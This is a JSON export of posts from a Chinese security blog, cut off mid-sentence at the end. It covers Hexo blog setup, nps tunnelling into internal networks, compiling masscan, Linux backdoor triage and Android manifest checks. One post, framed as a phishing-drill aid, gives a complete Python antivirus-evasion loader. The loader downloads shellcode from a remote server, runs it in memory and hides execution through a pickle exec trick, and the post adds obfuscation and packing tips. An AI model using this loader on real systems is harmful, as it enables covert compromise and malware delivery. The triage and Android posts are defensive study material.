[{"title":"Github+Hexo搭建静态博客","url":"/2021/12/18/2021/01.Github+Hexo%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2-2021.12.18/","content":"大佬们多在前方辛苦淌路，只有我在后面享受着大佬的果实。\n\n\n\n一、前言：我一直都有搭建博客的想法。不为出名。只为想通过强迫“记笔记”的方式，加速自己学习。\n曾经在腾讯云的VPS上面通过WordPress搭建了博客。\n但是由于WordPress太知名，也太致命。所以后续断断续续都舍弃了。\n今天无意间看到了@Assassins 小白大佬第一篇博客《Github+Hexo搭建静态博客》。\n每一步都非常详细。简直是嚼碎了喂在嘴里。也开阔了我的想法——原来博客可以搭建在github的平台上。通过静态页面也减少了网页受攻击的问题。\n于是，在了解了Hexo这个静态站点生成器后。略汗颜的向大佬在19年8月份写的这篇文章学习。\n在此仅作为一个留存记录，多半都是复制粘贴。原文请见：@Assassins 小白大佬的《Github+Hexo搭建静态博客》。\n\n二、步骤2.1 安装Node与Git2.1.1 先安装下面两个软件\nNode.js：https://nodejs.org/en/\n\n\nWindows下的Node.js安装及环境配置：https://www.cnblogs.com/liuqiyun/p/8133904.html\n\n\nGit：https://git-scm.com/download/win\n\n\nGit安装教程（详细）：https://www.jianshu.com/p/bebba0d8038e\n\n2.2 本地安装与初始化hexo2.2.1使用npm安装hexo安装命令： npm install -g hexo-cli \n【自己安装图片找不到了，图片再复制大佬的有些过分】\n\n不过按照上面node的环境配置，修改好安装的全局模块所在的路径，以及缓存cache的路径。\n没有报错就行。\n\n安装完了验证一下是否成功，命令:\nnpx hexo -v\n\n注：这里跟 19年相比。npm install后不能直接调用命令。会提示命令找不到。需要在前面 + npx \n\nok 安装完成\n2.2.2 接下来我们先用hexo进行本地建站先初始化Blog网站框架\n在本地电脑上建立一个Blog目录，并在shell中进行下面命令，初始化框架\nnpx hexo init &lt;文件夹&gt; //博客文件夹名称\n\n\n\nps：npx安装打印输出的东西。比19年的精简了太多。\n\ncd &lt;文件夹&gt;               //进入博客文件夹目录npm install\n\n\n2.2.3 网页配置：_config.yml\n整个站点的配置信息：可以配置网站的title、author、language、目录、文章、日期、分页、扩展（主题名称、部署）信息，这个文件是博客配置文件，改错了会导致网站不正常。里面主要需要用到的内容有：\n\nsource: 资源文件夹,存放用户资源，这个是博客文章源码所存放的地方\nthemes: 主题文件夹，Hexo会根据此来生成静态页面，默认是官方的landscape主题\n\n2.2.4 写blog 文章执行下面的命令创建一篇新的文章:\nhexo new &lt;文章名&gt;\n\n\n生成的文章在source/_posts文件夹下面\n\n可以看到文章已经生成好了\n命令：\n$ npx hexo generate` 简写： `hexo g\n\n生成静态文件\n2.2.5 启动hexo静态页面服务$ npx hexo server   简写： hexo s\n\n\n启动服务器，默认情况下，访问网址为： http://localhost:4000\n\nok这就是本地搭建成功的效果，不过这是默认主题，可以根据需要改主题\n2.3 Github的配置先注册GitHub账号，这个我就不说了。\n2.3.1 设置GitHub SSH Key本地设置git邮箱、用户名和密码\ngit config --global user.email &quot;你注册GitHub的邮箱&quot;git config --global user.name &quot;你的GitHub用户名&quot;\n\n本地创建SSH Key\nssh-keygen -t rsa -C &quot;邮箱地址”\n\n\n首先打开用户根目录（用户根目录一般为为C:\\Users\\username）查看是否已经有了SSH Key的文件夹.ssh\n\n添加生成的SSH Key到GitHub账户\n打开在当前用户的根目录下生成的.ssh文件里面的ssh.pub（ssh 公钥）,拷贝其内容到[SSH and GPG keys -&gt; SSH Keys -&gt; Add SSH Key]\n\n\n验证下SSH是否设置成功\nssh -T git@github.com\n\n第一次提示不能连接，直接输入yes即可。\n\n2.3.2 GitHub部署新储存库建立GitHub Pages之后，即可以将本地搭建的Hexo网站部署到GitHub上去\n创建存储库，名字就写你GitHub名字+Github.io\n\n按照这个命令，全都敲一遍。\n\n\ngit push -u origin main 这一步总是报timeout错。\n不过这个命令只有生成新项目的时候才会用到，以后不会用到了。所以成功一次就行。\n我的解决办法是开着全局代理然后有一次就成功了。\n理论上可以修改git push 的等待时间。改成5s就好了。\n但我没成功了就没弄。\n\n\n2.3.3 修改站点_config.yml配置文件repo: https://github.com/username/username.github.io.git （你的GitHub页面仓库地址）branch: master\n\n\n2.3.4 博客文件夹目录执行命令博客文件夹目录执行命令\nnpx Hexo g -d\n\n\n报错 ERROR Deployer not found: git ，输入命令：\nnpm install hexo-deployer-git --save\n\n\n再输入命令：\nnpx Hexo g -d\n\n部署到GitHub。访问域名(https://你的GitHub名字.github.io)\n\n成了。\n三、参考链接\nGithub+Hexo搭建静态博客（几乎完全按照做的）\nhexo史上最全搭建教程\n使用命令npm install -g hexo-cli 安装Hexo报错bash: hexo: command not found问题解决\n\n","categories":["博客搭建"]},{"title":"个性化设置hexo博客","url":"/2021/12/18/2021/02.%E4%B8%AA%E6%80%A7%E5%8C%96%E8%AE%BE%E7%BD%AEhexo%E5%8D%9A%E5%AE%A2-2021.12.18/","content":"该文章也是参考了@Assassins 小白大佬的《Github+Hexo搭建静态博客》。\n不过对我个人而言，搭建博客跟使用博客分开记录更方便后期的一个查找学习。于是便有了这篇笔记。\n\n\n\n一、换一个主题模板有一说一。@Assassins 小白大佬使用的这个 Next-Mist 模板确实好看。我真是心动不已。\n不过主题那么多，还是换一个同样好看的吧。\n搜了一会儿。决定使用 keep 主题。经过了解，他比较简约，挺适合我作为学习笔记来记录的。keep-中文使用教程\n到博客根目录打开Shell终端，输入下面命令\ngit clone https://github.com/XPoet/hexo-theme-keep themes/keep\n\n\n\n完成，设置配置文件。这里改下模板的名字\n 本地搭建看一下效果\nnpx Hexo s\n\n\n就这个吧。\n二、设置主题模板【基于keep主题】按照keep-中文使用教程 进行配置。\n2.1 给博客添加分类标签：2.1.1 修改 Angleashuaiby\\themes\\keep\\_config.yml 配置文件menu:  首页: /  归档: /archives  分类: /categories  # Tags: /tags  # Links: /links\n\n改好后输入命令\nnpx hexo new page categories\n\n\n2.1.2 修改 Angleashuaiby\\scaffolds\\_post.md 配置文件scaffolds目录下，是新建页面的模板，执行新建命令时，是根据这里的模板页来完成的，所以可以在这里根据你自己的需求添加一些默认值。\n打开scaffolds/post.md文件，在tages:上面加入categories:,保存后，重新执行hexo n &#39;name&#39;命令，会发现新建的页面里有categories:项了。\n\n配置就已经ok了\n2.1.3 写文章以后写文章时手动的在categories 添加分类内容即可。\n\n2.2 给博客开启文章字数统计和阅读时长2.2.1 安装依赖此时的配置文件是 E:\\Angleashuaiby\\themes\\keep\\_config.yml \n如果要开启文章字数统计和阅读时长，需在 Hexo 项目根目录下安装依赖 hexo-wordcount 。\nnpm install hexo-wordcount\n\n\n2.2.2 修改 Angleashuaiby\\themes\\keep\\_config.yml 配置文件post:  # Post word count  # Dependencies: hexo-wordcount (npm install hexo-wordcount)  # See: https://github.com/willin/hexo-wordcount  word_count:    enable: true    wordcount: true # word count, one article    min2read: true # time to read, one article\n\n\nwordcount 文章字数统计\nmin2read 文章阅读时长\n\n2.3 开启搜索功能:2.3.1 修改 Angleashuaiby\\themes\\keep\\_config.yml 配置文件local_search:  enable: true  preload: true # 表示是否在页面加载时预加载搜索数据。\n\n2.3.2 安装依赖在 Hexo 项目根目录下安装插件 hexo-generator-searchdb。\nnpm install hexo-generator-searchdb\n\n\n2.3.3 修改hexo的配置修改 E:\\Angleashuaiby\\_config.yml 文件。在下方添加以下内容：\n# Search## See: https://github.com/theme-next/hexo-generator-searchdbsearch:  path: search.json  field: post  content: true  format: striptags\n\n大功告成。\n2.4 博客的其他设置base_info:  title: Angleashuaiby&#x27;s note  author: Angleashuaiby  url: https://angleashuaiby.github.io/  设置了作者头像，logo。开启了缩放阴影效果：  hover:    shadow: true # shadow effect when the mouse hover    scale: true # scale effect when the mouse hover  开启了首页文章块底部的分类信息显示： home_article:  category:    enable: true # show category in home page article block     开启了代码复制，开启后可一键复制代码到剪贴板。： code_copy:    enable: true  开启目录结构：toc:  enable: true  # Automatically add list number to toc.  number: false  # If true, all level of TOC in a post will be displayed, rather than the activated part of it.  expand_all: true  # If true, open TOC every time when you enter the article page  init_open: true  开启阅读次数查询:website_count:  # busuanzi  # See: http://ibruce.info/2015/04/04/busuanzi/  busuanzi_count:    enable: true    site_uv: false    site_pv: false    page_pv: true开启图片懒加载功能：（试用）开启后，打开页面时不会加载所有图片，当视窗滚动到图片位置才加载对应的图片资源。lazyload:  enable: true  开启CDN:    该配置项用于开启部分主题资源（JS 文件、字体文件等）的 CDN 加速功能。  \n","categories":["博客搭建"]},{"title":"nps内网穿透","url":"/2022/06/24/2022/nps%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/","content":"当你真正喜欢做一件事时，自律就会成为你的本能。\n\n\n\nNPS工具简介nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。\n官网下载地址：https://github.com/ehang-io/nps/\n官网手册：https://ehang-io.github.io/nps/#/\n\n一、服务端1.1 服务端的安装进入官网下载对应版本的服务端nps软件。根据VPS的系统来进行下载，我这里下载的是linux_amd64_server.tar.gz版本。\n将此压缩包上传至VPS，此处假设文件夹路径为/root/nps。执行代码：\ntar -xzvf linux_amd64_server.tar.gzrm -rf linux_amd64_server.tar.gzsudo ./nps install  \t\t#一定要执行安装命令。sudo nps start/stop/restart\t\t\t\t\t#此命令用来控制nps服务端的启停默认的web登录端口为 8080 ，口令为：admin/123\n\n1.2 服务端修改配置登录成功后一定要修改相关密码，修改配置文件。\n\n一定要改账密和web控制端端口。\n要确保能从客户端设备上正常访问配置文件中所配置的bridge_port端口\n此配置文件才是真正用来控制nps的。要在此处进行账密的更改，更改后重启nps更新配置。\n\nsudo vim /etc/nps/conf/nps.conf\n\n1.3 服务web控制端 添加 客户端监听\n\n备注：名字\nBasic认证的用户名/密码： Socks代理时需要用到的用户名和密码\n唯一验证秘钥：客户端需要用到的东西，但是留空可以自动生成。\n其他就顾名思义了。\n\n\n\n这个秘钥客户端需要用到\n\n二、客户端2.1 客户端通过秘钥链接优点：通过秘钥链接的无需传配置文件信息。\n解压客户端windows主机上的windows_amd64_client.tar.gz，并在CMD中运行命令。\nnpc.exe -server=你的nps:8024 -vkey=你的密钥  注：点击web管理中客户端前的+号，即可复制启动命令\n\n\n如果有连接\n这里会由离线变成在线。此时成功连接。\n\n注：连接时，火绒会提示有软件尝试安装。【猜测是临时安装服务器的配置信息】\n2.2客户端通过配置信息连接此模式使用nps的公钥或者客户端私钥验证，各种配置在客户端完成，同时服务端web也可以进行管理。\n使用命令：\n./npc -config=npc配置文件路径\n\n配置文件说明：\n参考链接：https://ehang-io.github.io/nps/#/use?id=配置文件说明\n据学习，还是第一种方法要便捷。故此处不作过多介绍。\n\n三、配置socks5代理进行内网穿透要等客户端上线以后在配置Socks代理。连接后，点击隧道按钮——&gt;新增。\n\n\n\n模式选择 socks代理\n客户端ID 自动选择，如果没有，则看 客户端列表 连接的ID。此处为4\n备注留空\n服务端端口就是各种代理器去访问的端口。此处为8083。\n\n\n\n此时，使用Proxifier进行尝试。就成了。\n\n!\n","categories":["内网攻击"]},{"title":"windows下编译masscan","url":"/2022/06/16/2022/windows%E4%B8%8B%E7%BC%96%E8%AF%91masscan/","content":"知识共享不代表成果掠夺！！！\n\n\n\n前言：在做大批量内网端口扫描的时候，觉得nmap有些慢。\n突然想到Masscan工具，但是GitHub官网上没有编译好的。又不敢下载使用别人编译好的文件。\n所以想自行编译使用。但百度所搜的文章千篇一律。\n\n作者心语：全是复制粘贴，一个字都不改。还不贴原作者的链接。我根本不知道原作者是哪个大佬。\n知识共享不代表成果掠夺！！！\n\n且所复制的文章教的太过笼统，对初学者（我）超级不友好。\n于是便有了此笔记。用来记录我的编译过程。希望能够帮到其他的初学者。\n本文章的技术参考链接：https://blog.csdn.net/qq_38547744/article/details/105241525\n\n一、 masscan简介github地址：https://github.com/robertdavidgraham/masscan\n\n二、项目编译2.1 编译环境介绍我个人使用的是社区版的VS2019。\n\n附 VS官方下载链接：\n\nVisual Studio 2019的下载地址\n\nVisual Studio 最新版 2022的下载地址\n\n\n2.2 正式编译从github下载后,打开vs10文件夹中的所选项目。\n\n打开这个文件的时候，如果 VS没有安装 “ 使用C++的桌面开发 “ 的工作载荷会跳出提示。\n选择确认安装即可。\n\n\n由于我用的是VS2019，所以需要添加编译配置\nSource Files-&gt;misc-&gt;string_s.h中添加。\n\n作者心语：这三个是masscan.sln文件里面的内容。\n我初次体验VS，还以为是VS的系统设置。找了半天 = _ =\n\n\n源博客讲述的是添加一定的代码。例如这样：\n\n但是我发现添加的内容，跟下方的代码几乎一致。\n后期经过大胆试验。可以直接将下方1900替换为1929即可。此方法更为简单，且极不容易报错踩坑。\n\n作者心语：跟着原文章添加，编译时报了很多错误。由于是初次编译代码，所以对于我来说，调试很难。\n通过此方法，没有报错。所以我就没有踩坑总结。\n\n如图所示：\n\n\n问：如何知道要填的为1929。而不是别的数字呢？\n答：_MSC_VER是微软用来定义编译器主版本的宏定义。其中_MSC_VER == 1929 的1929 是要根据不同版本的VS替换的。\n要去这个网址查：https://docs.microsoft.com/en-us/cpp/preprocessor/predefined-macros?view=msvc-170。\n在最下方的表格处。或者直接页面搜索_MSC_VER\n\n由于我是Visual Studio 2019 version 16.11。所以此处为1929。\n\n最后点击”本地windows调试器”。\n\n没有报错就是成了。\n\n生成的文件在 bin 目录下\n\n\n\n成功啦。希望同行初学者同样顺利！！！\n","categories":["杂七杂八"]},{"title":"python免杀shellcode加载器","url":"/2022/07/04/2022/python%E5%85%8D%E6%9D%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/","content":"在真实的性命里，每桩伟业都由信心开始，并由信心跨出第一步。\n\n\n0、前言客户现场需要做钓鱼邮件演练。笔者在互联网上查找免杀方式的时候，发现了一个比较新颖的方法、在此记录。\n主要参考文章为：CS结合python3混淆shellcode制作免杀脚本\n具体实现流程：shellcode和加载器(pyminifier混淆后)经base64编码后，放远程服务器备用，然后目标主机远程下载两次。具体流程如图所示：\n\n笔者在此基础上进行了代码分析以及补充了收集到的免杀技巧总结。\n\n1、shellcodeCS生成shellcode。把shellcode进行Base64编码后放在shellcode.txt里面并存放到服务器\n\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\\x41\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x2c......\n\n\n2、加载器修改加载器的服务器地址后进行一次base64加密，然后把代码放在loader.txt里面并存放到服务器\n2.1 代码如下：import ctypes,urllib.request,codecs,base64shellcode = urllib.request.urlopen(&#x27;http://vps的ip地址/shellcode.txt&#x27;).read()shellcode = shellcode.strip()shellcode = base64.b64decode(shellcode)shellcode =codecs.escape_decode(shellcode)[0]shellcode = bytearray(shellcode)ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)ctypes.windll.kernel32.RtlMoveMemory(    ctypes.c_uint64(ptr),    buf,    ctypes.c_int(len(shellcode)))handle = ctypes.windll.kernel32.CreateThread(    ctypes.c_int(0),    ctypes.c_int(0),    ctypes.c_uint64(ptr),    ctypes.c_int(0),    ctypes.c_int(0),    ctypes.pointer(ctypes.c_int(0)))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))\n\n2.2 加载器代码解析：首先是获取shellcode的值，并进行base64解码\nshellcode = urllib.request.urlopen(&#x27;http://vps的ip地址/shellcode.txt&#x27;).read()shellcode = shellcode.strip()shellcode = base64.b64decode(shellcode)shellcode = base64.b64decode(shellcode)shellcode =codecs.escape_decode(shellcode)[0]\n\n设置VirtualAlloc返回类型为ctypes.c_unit64\nctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64\n\n调用VirtualAlloc函数，来申请一块动态内存区域。\nptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))\n\n\n VirtualAlloc函数原型和参数如下：\n LPVOID VirtualAlloc&#123;LPVOID lpAddress, #要分配的内存区域的地址DWORD dwSize,      #分配的大小DWORD flAllocationType, #分配的类型DWORD flProtect     #该内存的初始保护属性&#125;;\n\n将shellcode指向指针\nbuf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)\n\n调用RtlMoveMemory函数可以将shellcode载入内存。从指定内存地址将内容复制到我们申请的内存中去，shellcode字节多大就复制多大\nctypes.windll.kernel32.RtlMoveMemory(    ctypes.c_uint64(ptr),    buf,    ctypes.c_int(len(shellcode)))\n\n\nRtlMoveMemory的原型和参数如下：\nRtlMoveMemory&#123;Destination,\t#指向移动目的地址的指针。Source,\t\t#指向要复制的内存地址的指针。Length\t\t#指定要复制的字节数。&#125;; \n\n调用 CreateThread 函数，完成shellcode注入\nhandle = ctypes.windll.kernel32.CreateThread(    ctypes.c_int(0),    ctypes.c_int(0),    ctypes.c_uint64(ptr),    ctypes.c_int(0),    ctypes.c_int(0),    ctypes.pointer(ctypes.c_int(0)))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))\n\n\nCreateThread的原型和参数如下：\nHANDLE CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,#线程安全属性SIZE_T dwStackSize,       #置初始栈的大小，以字节为单位LPTHREAD_START_ROUTINE lpStartAddress,  #指向线程函数的指针LPVOID lpParameter,          #向线程函数传递的参数DWORD dwCreationFlags,       #线程创建属性LPDWORD lpThreadId           #保存新线程的id)\n\n等待线程结束调用WaitForSingleObject函数用来检测线程的状态\nctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))\n\n\nWaitForSingleObject函数原型和参数\nDWORD WINAPI WaitForSingleObject(__in HANDLE hHandle,     #对象句柄。可以指定一系列的对象__in DWORD dwMilliseconds  #定时时间间隔);\n\n\n3、主程序zhu.py,最终在目标上执行的exe文件。\n修改服务器地址后使用pyinstaller打包成exe可执行文件\n3.1 实现代码如下import pickleimport ctypes,urllib.request,codecs,base64sectr = urllib.request.urlopen(&#x27;http://vps的ip地址/loader.txt&#x27;).read()sectr = base64.b64decode(sectr).decode(&quot;utf-8&quot;)class A(object):    def __reduce__(self):        return (exec, (sectr,))ret = pickle.dumps(A())ret_base64 = base64.b64encode(ret)ret_decode = base64.b64decode(ret_base64)pickle.loads(ret_decode)\n\n3.2 代码解析先对Class A进行序列化，再对序列化的代码进行base64加密。\nclass A(object):    ...ret = pickle.dumps(A())ret_base64 = base64.b64encode(ret)\n\n最后反序列化加载loader.\nret_decode = base64.b64decode(ret_base64)pickle.loads(ret_decode)\n\n通过__reduce__这个魔术方法执行了loader\ndef __reduce__(self):        return (exec, (sectr,))\n\n\n4、其他免杀小技巧总结：4.1 缩小和混淆py代码缩小python代码\npyminify zhu.py --output zhu_mini.py\n\n混淆main-mini.py中的python代码 \nhttps://pyob.oxyry.com/\n\n\n4.2 Pyinstaller打包成可执行文件exe将混淆后的代码保存到一个文件后\npyinstaller.exe -Fw -i .\\setting.ico --key=123456 .\\final.py\n\n\n五、免杀效果\n\n\n六、笔者总结：杀毒软件的原理一般是匹配特征码，行为监测，虚拟机（沙箱），内存查杀等。对抗特征码的检查的方式大致分为 混淆代码 与 编译代码。当下不仅shellcode作为特征码识别。加载器代码的部分代码也已经被当做特征码识别了。所以对加载器的各种处理也是必要的。\n此文章的免杀的思路为：\n\n进行了Base64编码解码以及python的序列化与反序列化的绕过。\n通过shellcode与加载器的分离。二次请求来进一步增加了静态免杀的概率。\n与大佬进行讨论时：目前免杀用base64编码绕过较多，部分安全软件属实可以检测到。业内很少用加密绕过的。若用aes加密绕过，免杀效果更佳。\n\n\n参考链接：\nCS结合python3混淆shellcode制作免杀脚本。\n\nPython简单免杀shellcode上线CS\n\npython-shellcode加载器初体验\n\n\n","categories":["杂七杂八"]},{"title":"linux后门排查笔记","url":"/2022/07/21/2022/linux%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5%E7%AC%94%E8%AE%B0/","content":"别灰心， 人生就是这样起起落落落落落落落落落落落\n\n\n\n在服务器被入侵后进行应急响应无非通过网络排查、进程排查、文件排查、系统信息排查等方法进行入侵排查。在此对Linux操作系统排查的常用命令进行记录汇总，方便日后排查时使用。\n0x00 网络排查查看是否存在可疑网络连接\nnetstat -antpl|more\n\n开启服务检查（常用于判断开启哪种web服务）\nsystemctl | grep -E &quot;\\.service.*running&quot;\n\n\n0x01 进程排查使用ps命令列出系统中当前运行的那些进程。\nps -ef | more  或者 ps -aux |more\n\n通过top命令显示系统中各个进程的资源占用状况，利于发现挖矿病毒\ntop\n\n如发现异常，可使用一下命令进一步排查。可用一些查询命令，或查看/proc文件夹：\npwdx $PID  或  ls -l /proc/$PID/exe    #查看下pid所对应的进程文件路径ps eho command -p $PID 或 cat /proc/$PID/cmdline    #查看该进程启动的完整命令行readlink /proc/$PID/cwd    #查看该进程启动时候所在的目录cat /proc/$PID/status    #查看该进程状态信息，比stat/statm更具可读性strings -f /proc/1461/environ | cut -f2 -d &#x27;&#x27;    #查看该进程启动时的完整环境变量lsof -p $PID    #列出该进程所打开的所有文件\n\n\n0x02 系统信息排查历史命令查询\nhistory|moremore /root/.bash_history\n\n登录信息查询\nwho 查看当前登录用户（tty本地登陆 pts远程登录）w 查看系统信息，想知道某一时刻用户的行为last 列出所有用户登陆信息lastb 列出所有用户登陆失败的信息lastlog 列出所有用户最近一次登录信息\n\n查看系统启动项，是否存在可疑启动项\nsystemctl list-unit-files --type=service | grep &quot;enabled&quot;\n\n检查开机启动项\nmore /etc/rc.local\n\n检查计划任务\ncrontab -lmore /etc/crontabls -al /var/spool/cron/more/etc/anacrontab\t\t\t\tls -al /var/spool/anacron/*注：#anacron 会以 1 天、1周（7天）、一个月作为检测周期，判断是否有定时任务在关机之后没有执行。如果有这样的任务，那么 anacron 会在特定的时间重新执行这些定时任务。\n\n检查有无新添账号\ncat /etc/passwd\n\n是否有 UID 相同的用户（账号克隆）\nawk -F: &#x27;&#123;a[$3]++&#125;END&#123;for(i in a)if(a[i]&gt;1)print i&#125;&#x27; /etc/passwd\n\n检查/etc/passwd 文件里用户结尾是否有/bin/bash 或/bin/sh，即查看可以执行命令的用户。\ncat /etc/passwd | grep -E &quot;/bin/(bash|sh)$&quot; | awk -F: &#x27;&#123;print $1&#125;&#x27;\n\n查看有无空口令账户\ngawk -F: &#x27;($2==&quot;&quot;) &#123;print $1&#125;&#x27; /etc/shadow\n\n顺便排查ssh是否允许空口令登录\nmore /etc/ssh/sshd_config |grep PermitEmptyPassword\n\n检查拥有sudo权限的账号\nmore /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;\n\n查找SUID / SGID设置的文件（多用于防止用户越权）\nSUID： find . -perm /4000 SGID： find . -perm /2000\n\n\n0x03 文件排查webshell木马文件查找技巧\n查询高权限的常见木马后缀文件:find /var/www -name *.jsp* -perm 777   #或者jsp换成ph*/as*查找七天内被修改的以 php 为后缀的文件:find /var/www -mtime -7 -iname &quot;*.php&quot; | xargs ls -alt\n\nssh秘钥排查：\ncd /root/.ssh &amp;&amp;  ls -almore /root/.ssh/authorized_keys\n\n文件完整性排查\n主要侧重系统关键文件，因为是 rootkit 常用的手段，替换关键文件，进行隐藏等，如 ifconfig/ls/cat等\n排查方法：查找文件位置，并计算 MD5 提交威胁情报平台检查whereis ifconfigmd5sum  /usr/sbin/ifconfig \n\n\n0x03 日志排查\n/var/log/secure                记录大多数应用输入的账号与密码，登录成功与否。一般我们需要重点去关注secure安全日志，检查系统错误登陆日志，统计IP重试次数，成功登录的时间、用户名和ip，确认账号是否存在暴力破解或异常登录的情况。\n\n登录成功more /var/log/secure* | grep &quot;Accepted password&quot;  或者 last 命令登录失败more /var/log/secure* | grep &quot;Failed password&quot;\t或者 lastb 命令\n\n\n其他的日志信息排查\n\n/var/log/message      包括整体系统信息/var/log/auth.log       含系统授权信息，包括用户登录和使用的权限机制等/var/log/userlog        记录所有等级用户信息的日志/var/log/cron         记录crontab命令是否被正确的执行/var/log/vsftpd.log      记录Linux FTP日志\n\n\n0x04 其他后门排查检查strace键盘记录工具\nstrace是一个动态跟踪工具，它可以跟踪系统调用的执行。恶意攻击者可以把他当成一个键盘记录的后门，来扩大我们的信息收集范围\n使用 alias 命令即可发现异常。\n\n","categories":["应急响应"]},{"title":"AndroidManifest.xml 文件检测","url":"/2022/12/08/2022/AndroidManifest-xml-%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B/","content":"好好去爱，去生活。记住，每天的太阳都是新的，不要辜负了美好的晨光。\n\n\n\n[高] Debuggable 配置检测漏洞描述该项被打开，app 存在被恶意程序调试的风险，可能导致泄露敏感信息等问题。\n测试过程查看 AndroidManifest 中的 Debuggable 项。若为True。则存在漏洞。\n漏洞代码段：\n\n漏洞建议不设置 debuggable 选项，或者将其设置成 false，推荐使用后面一种。\n\n[高] allowbackup备份检测漏洞描述被测应用的AndroidManifest.xml文件中allowBackup属性值被设置为true，可通过adb backup对应用数据进行备份，在无root的情况下可以导出应用中存储的所有数据，造成用户数据泄露。\n测试过程查看 AndroidManifest 中的 allowBackup 项。若为True。则存在漏洞。    \n无漏洞代码段：\n\n漏洞建议\n 将AndroidManifest.xml文件下Allowbackup属性设置为false； \n 使用良好加密，例如启动应用时计算设备唯一标识，从服务端获取对应密钥后解密本地配置。 \n\n\n[中] 危险系统权限使用检测漏洞描述若 App 如果使用了一些系统限制权限，诸如“android.permission.WRITE_SECURE_SETTINGS” 等，则该 app 应该是设备自带的系统或google 自带的 app，并且应该放置在”/system/app”目录下。否则就是一个恶意 app。\n测试过程检测&lt;uses-permission&gt; 中是否涉及以下权限的申请，若有其中的任何一个存在，则将该扫描项标注为提醒，并将又问题的代码段标注出来。\n1. android.permission.WRITE_SETTINGS\t\t#允许程序读取或写入系统设置2. android.permission.INSTALL_PACKAGES\t\t#允许一个程序安装packages3. android.permission.MOUNT_FORMAT_FILESYSTEMS\t\t#格式化可移动文件系统，比如格式化清空SD卡4. android.permission.MOUNT_UNMOUNT_FILESYSTEMS\t\t#允许挂载和反挂载文件系统可移动存储5. android.permission.RESTART_PACKAGES\t\t#允许程序重新启动其他程序。注：android.permission.REQUEST_INSTALL_PACKAGES 是新增未知来源安装权限。暂不算危险漏洞\n\n漏洞代码段：\n\n漏洞建议根据业务需求，如非必要，移除这些高级别权限。\n参考链接\nAndroid权限操作之uses-permission详解\nAndroid（permission）常用权限\n\n\n[低] 非必要权限检测漏洞描述该权限是使在模拟器中使用，用于获取模拟定位信息。\n测试过程检查是否在正式环境中存在该权限 android permission ACCESS MOCKLOCATION权限\n漏洞代码段：\n\n漏洞建议移除 android.permission.ACCESS_MOCK_LOCATION 权限。\n\n[低] PermissionGroup 检测漏洞描述PermissionGroup 可以对 permission 进行一个逻辑上的分组。如果PermissionGroup 的属性为空，会导致权限定义无效，且其他app 无法使用该权限\n测试过程查看 PermissionGroup 中的 protectionlevel  属性设置 。\n如果系统使用了PermissionGroup。但protectionlevel 为 normal或 dangerous 或者未设置 protectionLevel。均认为不安全并标注问题的代码段。\n未设置 protectionLevel，默认情况下，permission 的protectionLevel 为 normal。\n漏洞代码段：\n\n漏洞建议设置 PermissionGroup 属性值或者不使用 PermissionGroup。\n\n[低] 应用中的ProtectionLevel 检测漏洞描述对 app 的自定义 permission 的 protectionLevel 属性设置不当，会导致组件（如：content provider）数据泄露危险。最好的权限设置应为”signature”或”signatureOrSystem”，进而避免被第三方应用利用。\n测试过程查看应用中的 ProtectionLevel 属性设置 。\n如果应用中的permission 的protectionlevel 为 normal或 dangerous 或者未设置 protectionLevel。均认为不安全并标注问题的代码段。\n未设置 protectionLevel，默认情况下，permission 的protectionLevel 为 normal。\n漏洞代码段：\n\n漏洞建议注意使用”signature”或”signatureOrSystem”防止其他 app 注册或接受该 app 的消息，提高安全性\n\n[低] shareUserid 检测漏洞描述通过 sharedUserId，可以让拥有同一个 User Id 的多个 apk 运行在同一个进程中，互相访问任意资源。\n将 sharedUserId 设置为 android.uid.system，可以把 app 放到系统进程中，app 将获得极大的权限。如果 app 同时有 master key漏洞，容易导致被 root\n测试过程先检测 app/build.gradle 中的 minSdkVersion，\n\n若 &lt;= 19，则说明其运行的系统可能存在 mster key 漏洞（Android 系统 &lt;= 4.4，即 API Level &lt;= 19 存在 master key 漏洞）。此时若sharedUserId 设置为 android.uid.system，则标注为高危漏洞；\n若 minSdkVersion &gt;19 则是提醒\n\n漏洞代码段：\n\n漏洞建议采用 API 等级高于 19 的系统。若非特殊的需求，一般不会将sharedUserId 设置为 android.uid.system。\n\n[低] app 最低版本检测漏洞描述攻击者根据版本已知漏洞，对应用进行调试，破解，逆向等相关操作\n测试过程查看 app 所支持的最低版本的系统 api。\n检测app/build.gradle 中的 minSdkVersion 确定 APP 所支持的最低版本的系统 API，对应到相应的 Android 版本上.\n漏洞代码段：\n\n漏洞建议罗列出跟最低版本相关的漏洞和 